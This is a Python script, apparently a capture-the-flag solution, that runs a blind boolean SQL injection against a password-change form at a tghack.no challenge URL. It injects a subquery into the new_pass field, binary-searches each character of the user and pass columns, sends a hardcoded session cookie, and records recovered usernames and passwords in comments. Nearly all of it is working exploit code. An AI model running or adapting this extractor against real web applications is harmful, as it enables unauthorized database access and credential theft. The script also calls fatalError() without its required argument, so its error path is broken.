#!/usr/bin/env python3

import requests
import sys
from urllib.parse import quote_plus

# Replace this with your instance URL
URL = 'https://bobby.tghack.no/password'

def fatalError(msg):
    sys.exit("ERROR: " + msg)

def tryLogin(body):

    response = requests.post(URL,
                             data=body,
                             headers = {
                                 'Content-Type': 'application/x-www-form-urlencoded',
                                 'Cookie': 'id=5e8e86e9xfc92bacaa1fc350dae30bd715da26b6b1825eeeb1917a1f1fcfb5ee6302c5e527a6acb985499bf23ba9ac75ebc6d0fa93ec462393636da5ad23024385e865192x6bd2d20568d1a070257f1c4e82a20245990667610f3cff781e0f4c978bcb25f2',
                             },
                             allow_redirects=False
                             )
    if response.status_code != 200:
        print(response.status_code)
        fatalError()

    # print(response.text)
    if 'Password changed!' in response.text:
        return True
    else:
        return False


def probeColValueCharAtIndex2(colname, charIndex):

    lowGuessIndex = 33
    highGuessIndex = 126

    while lowGuessIndex < highGuessIndex:
        guessIndex = int(lowGuessIndex + (highGuessIndex - lowGuessIndex) / 2)
        guess = chr(guessIndex)
        encodedGuess = quote_plus(guess)

        body="user=bobby&old_pass=bobby&new_pass=sam' where user=? or user=? or (select 1 from users where SUBSTR(" + colname + ", " + str(charIndex) + ", 1) >= '" + encodedGuess + "') -- "

        if tryLogin(body):
            if lowGuessIndex == guessIndex:
                print("Char Index: " + str(charIndex) + ", value: " + guess)
                return guess
            lowGuessIndex = guessIndex
        else:
            highGuessIndex = guessIndex

    return False

def probeColValue2(colName):
    colValue = ''
    for charIndex in range(1, 200):
        char = probeColValueCharAtIndex2(colName, charIndex)
        if not char:
            break
        colValue += char
        print(colValue)

    print("Col: " + colName + ", value: " + colValue)


# Col: username, value: velia
probeColValue2('user')

# Col: password, value: terrence
# probeColValue2('pass')
